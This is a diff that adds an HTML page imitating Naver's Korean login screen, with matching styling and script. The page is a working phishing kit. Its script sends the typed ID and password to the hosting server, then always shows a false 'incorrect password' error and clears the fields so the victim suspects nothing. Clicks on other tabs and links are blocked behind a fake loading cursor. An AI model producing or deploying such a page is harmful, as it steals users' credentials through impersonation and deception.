@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>네이버 : 로그인</title>
+  <link id="favicon" rel="icon" href="static/images/app_logo.png">
+</head>
+<body>
+  <div class="wrap">
+    <div class="header">
+      <a href="https://www.naver.com" target="_blank">
+        <img src="static/images/naver_logo.png" alt="NAVER" class="naver_logo">
+      </a>
+    </div>
+
+    <div class="login_container">
+      <div class="login_box">
+        <ul class="tab_list">
+          <li class="tab on">ID/전화번호</li>
+          <li class="tab">일회용 번호</li>
+          <li class="tab">QR코드</li>
+        </ul>
+
+        <form class="login_form">
+          <div class="input_box_group" id="inputBoxGroup">
+            <div class="input_box top">
+              <input type="text" placeholder="아이디 또는 전화번호">
+              <button type="button" class="clear_btn" tabindex="-1">
+                <img src="static/images/x.png" alt="지우기">
+              </button>
+            </div>
+            <div class="input_box bottom">
+              <input type="password" placeholder="비밀번호">
+              <button type="button" class="eye_btn"tabindex="-1">
+                <img src="static/images/eyex.png" alt="비밀번호 보기">
+              </button>
+            </div>
+          </div>
+
+          <div class="login_keep">
+            <label class="image_checkbox">
+              <input type="checkbox" id="keep_login">
+              <span class="check_img"></span>
+              로그인 상태 유지
+            </label>
+            <div class="ip_security">
+              <span>IP보안</span>
+              <label class="switch">
+                <input type="checkbox" checked>
+                <span class="slider"></span>
+              </label>
+            </div>
+          </div>
+
+          <!-- ✅ 에러 메시지 위치 -->
+          <div class="error_msg" id="errorMessage"></div>
+
+          <button type="submit" class="login_btn">로그인</button>
+          <p class="passkey_note">지문ㆍ얼굴 인증을 설정했다면</p>
+          <button type="button" class="passkey_btn">패스키 로그인</button>
+        </form>
+
+        <ul class="help_links">
+          <li><a href="#">비밀번호 찾기</a></li>
+          <li><a href="#">아이디 찾기</a></li>
+          <li><a href="#">회원가입</a></li>
+        </ul>
+      </div>
+
+      <div class="banner">
+        <img src="static/images/add.png" alt="광고 배너" class="banner_img">
+      </div>
+    </div>
+
+    <footer class="footer">
+      <ul class="footer_links">
+        <li><a href="#">이용약관</a></li>
+        <li><a href="#"><strong>개인정보처리방침</strong></a></li>
+        <li><a href="#">책임의 한계와 법적고지</a></li>
+        <li><a href="#">회원정보 고객센터</a></li>
+      </ul>
+      <div class="footer_copy">
+        <span class="footer_logo">NAVER</span>
+        <span>Copyright © NAVER Corp. All Rights Reserved.</span>
+      </div>
+    </footer>
+  </div>
+
+<script>
+  const pwInput = document.querySelector('input[type="password"]');
+  const eyeBtn = document.querySelector('.eye_btn');
+  const idInput = document.querySelector('input[type="text"]');
+  const clearBtn = document.querySelector('.clear_btn');
+  const inputBoxGroup = document.getElementById('inputBoxGroup');
+  const loginForm = document.querySelector('.login_form');
+  const errorMsg = document.getElementById('errorMessage');
+
+  pwInput.addEventListener('input', () => {
+    eyeBtn.style.display = pwInput.value.length > 0 ? 'block' : 'none';
+  });
+  eyeBtn.style.display = 'none';
+
+  eyeBtn.addEventListener('click', () => {
+    const isHidden = pwInput.getAttribute('type') === 'password';
+    pwInput.setAttribute('type', isHidden ? 'text' : 'password');
+
+    eyeBtn.querySelector('img').src = isHidden
+      ? 'static/images/eye_open.png'
+      : 'static/images/eyex.png';
+  });
+
+  idInput.addEventListener('input', () => {
+    clearBtn.style.display = idInput.value.length > 0 ? 'block' : 'none';
+  });
+  clearBtn.style.display = 'none';
+
+  clearBtn.addEventListener('click', () => {
+    idInput.value = '';
+    clearBtn.style.display = 'none';
+    idInput.focus();
+  });
+
+  document.querySelectorAll('.input_box input').forEach(input => {
+    input.addEventListener('focus', () => {
+      inputBoxGroup.classList.add('active');
+    });
+    input.addEventListener('blur', () => {
+      inputBoxGroup.classList.remove('active');
+    });
+  });
+
+  function fakeCursorLoading() {
+    document.body.classList.add('loading');
+    const favicon = document.getElementById('favicon');
+    favicon.href = 'static/images/loading.gif';
+    setTimeout(() => {
+      document.body.classList.remove('loading');
+      favicon.href = 'static/images/app_logo.png';
+    }, 2500);
+  }
+
+  document.querySelectorAll('.tab_list .tab:not(.on), .passkey_btn, .help_links a').forEach(el => {
+    el.addEventListener('click', (e) => {
+      e.preventDefault();
+      fakeCursorLoading();
+    });
+  });
+
+  loginForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const idVal = idInput.value.trim();
+    const pwVal = pwInput.value.trim();
+
+    if (!idVal) {
+      errorMsg.textContent = "아이디를 입력해주세요";
+      errorMsg.style.display = 'block';
+    } else if (!pwVal) {
+      errorMsg.textContent = "비밀번호를 입력해주세요";
+      errorMsg.style.display = 'block';
+    } else {
+      fetch('/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `id=${encodeURIComponent(idVal)}&pw=${encodeURIComponent(pwVal)}`
+      })
+      .then(response => {
+        if (response.ok) {
+          errorMsg.textContent = "아이디(로그인 전화번호, 로그인 전용 아이디) 또는 비밀번호가 잘못 되었습니다. 아이디와 비밀번호를 정확히 입력해 주세요.";
+          errorMsg.style.display = 'block';
+
+          idInput.value = '';
+          pwInput.value = '';
+        }
+      })
+      .catch(error => {
+        console.error('전송 오류:', error);
+      });
+    }
+  });
+
+</script>
+
+
+  <style>
+    body {
+      margin: 0;
+      font-family: "Malgun Gothic", sans-serif;
+      background: #fff;
+      color: #000;
+    }
+
+    body.loading {
+      cursor: wait;
+    }
+
+    .wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 80px 0 40px;
+    }
+
+    .naver_logo {
+      width: 180px;
+      margin-bottom: 30px;
+    }
+
+    .login_container {
+      width: 460px;
+    }
+
+    .login_box {
+      border: 1px solid #e5e5e5;
+      border-radius: 12px;
+      padding: 30px 32px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+    }
+
+    .tab_list {
+      display: flex;
+      justify-content: space-between;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      list-style: none;
+      padding-left: 0;
+    }
+
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 12px 0;
+      font-weight: bold;
+      background: #f8f9fa;
+      cursor: pointer;
+      color: #666;
+    }
+
+    .tab.on {
+      background: #fff;
+      color: #03c75a;
+      border-bottom: 2px solid #03c75a;
+    }
+
+    .input_box_group {
+      border: 1px solid #dadada;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 12px;
+      transition: border 0.1s;
+      padding: 1px;
+      box-sizing: border-box;
+    }
+
+    .input_box_group.active {
+      border: 2px solid #03c75a;
+    }
+
+    .input_box {
+      position: relative;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    .input_box.bottom {
+      border-top: 1px solid #e3e5e8;
+    }
+
+    .input_box input {
+      width: 100%;
+      padding: 18px 45px 18px 15px;
+      border: none;
+      font-size: 15px;
+      box-sizing: border-box;
+    }
+
+    .input_box input:focus {
+      outline: none;
+    }
+
+    .clear_btn,
+    .eye_btn {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      border: none;
+      background: none;
+      padding: 0;
+      cursor: pointer;
+    }
+
+    .clear_btn img,
+    .eye_btn img {
+      width: 18px;
+      height: 18px;
+    }
+
+    .image_checkbox {
+      display: inline-flex;
+      align-items: center;
+      font-size: 13px;
+      color: #444;
+      cursor: pointer;
+      white-space: nowrap;
+    }
+
+    .image_checkbox input {
+      display: none;
+    }
+
+    .image_checkbox .check_img {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      margin-right: 6px;
+      background-image: url("static/images/checkbox_off.png");
+      background-size: contain;
+      background-repeat: no-repeat;
+      transition: transform 0.1s ease;
+    }
+
+    .image_checkbox input:checked + .check_img {
+      background-image: url("static/images/checkbox_on.png");
+      transform: scale(1.15);
+    }
+
+    .switch {
+      position: relative;
+      width: 80px;
+      height: 50px;
+      display: inline-block;
+    }
+
+    .switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+
+    .slider {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: url("static/images/off.png") center no-repeat;
+      background-size: contain;
+    }
+
+    .switch input:checked + .slider {
+      background: url("static/images/on.png") center no-repeat;
+      background-size: contain;
+    }
+
+    .login_btn {
+      width: 100%;
+      height: 48px;
+      background: #03c75a;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .passkey_note {
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+      margin: 16px 0 8px;
+    }
+
+    .passkey_btn {
+      width: 100%;
+      height: 48px;
+      background: #fff;
+      color: #03c75a;
+      border: 1px solid #03c75a;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .help_links {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #888;
+      list-style: none;
+      padding: 0;
+    }
+
+    .help_links a {
+      text-decoration: none;
+      color: #666;
+    }
+
+    .banner {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .banner_img {
+      width: 100%;
+      border-radius: 8px;
+    }
+
+    .footer {
+      margin-top: 40px;
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+    }
+
+    .footer_links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      list-style: none;
+      padding: 0;
+      margin-bottom: 10px;
+    }
+
+    .footer_links a {
+      text-decoration: none;
+      color: #666;
+    }
+
+    .footer_logo {
+      color: #03c75a;
+      font-weight: bold;
+      margin-right: 6px;
+    }
+
+    .footer_copy {
+      color: #666;
+      font-size: 12px;
+    }
+
+    .ip_security {
+      display: flex;
+      align-items: center;
+      gap: 2px;
+      font-size: 13px;
+      color: #444;
+    }
+
+    .ip_security span {
+      display: inline-block;
+      line-height: 1;
+      margin: 0;
+    }
+
+    .ip_security .switch {
+      margin: 0;
+      width: 40px;
+      height: 40px;
+      transform: translateY(2px);
+    }
+
+    .login_keep {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 8px 0 4px;
+      font-size: 13px;
+      color: #444;
+      flex-wrap: nowrap;
+    }
+
+    /* ✅ 에러 메시지 스타일 */
+    .error_msg {
+      color: rgb(255, 1, 1);
+      font-family: -apple-system, BlinkMacSystemFont, helvetica, "Apple SD Gothic Neo", sans-serif;
+      font-size: 12px;
+      line-height: 16px;
+      letter-spacing: -0.5px;
+      text-align: left;
+      vertical-align: middle;
+      word-break: keep-all;
+      width: 100%;               /* 가득 채우되 */
+      max-width: 370px;          /* 최대 너비 제한 */
+      margin: 4px 0 0 0;         /* 왼쪽 여백 제거 */
+      padding-left: 0;           /* 패딩도 제거 */
+      display: none;
+    }
+
+  @media (max-width: 480px) {
+    .login_container {
+      width: 100%;
+      padding: 0 16px;
+      box-sizing: border-box;
+    }
+
+    .login_box {
+      padding: 24px 20px;
+    }
+
+    .tab_list {
+      font-size: 14px;
+    }
+
+    .input_box input {
+      font-size: 14px;
+      padding: 16px 40px 16px 12px;
+    }
+
+    .login_btn,
+    .passkey_btn {
+      font-size: 15px;
+      height: 44px;
+    }
+
+    .footer_links {
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .footer {
+      font-size: 11px;
+      padding: 0 10px;
+    }
+
+    .banner_img {
+      border-radius: 4px;
+    }
+
+    .error_msg {
+      font-size: 12px;
+      max-width: 100%;
+    }
+  }
+
+  </style>
+</body>
+</html>
